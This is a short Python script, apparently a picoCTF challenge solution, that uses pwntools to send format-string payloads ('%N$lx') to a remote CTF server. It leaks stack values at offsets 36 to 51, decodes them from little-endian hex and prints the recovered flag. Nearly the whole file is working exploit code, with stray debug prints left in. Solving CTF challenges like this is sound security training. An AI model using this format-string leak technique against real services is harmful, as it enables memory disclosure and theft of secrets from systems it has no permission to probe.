import pwn
import time

elf = pwn.context.binary = pwn.ELF('./vuln')
io = elf.process()

#Starts at 36
fullFlag =""
for i in range(16):
    io = pwn.remote('saturn.picoctf.net',58233)
    io.recv(1000)
    index = 36+i
    payload = "%"+str(index)+"$lx"
    io.sendline(payload)
    io.recvline()
    flag = io.recvline()
    flag = flag.decode("ASCII")
    currentPart = ""
    for x in range(0, len(flag)-1,2):
        currentChar = flag[x] + flag[x+1]
        currentChar = int(currentChar,16)
        currentChar = chr(currentChar)
        currentPart = currentChar + currentPart
    io.close()
    fullFlag = fullFlag + currentPart
print("TEST")
print(fullFlag)
print("Yikes")
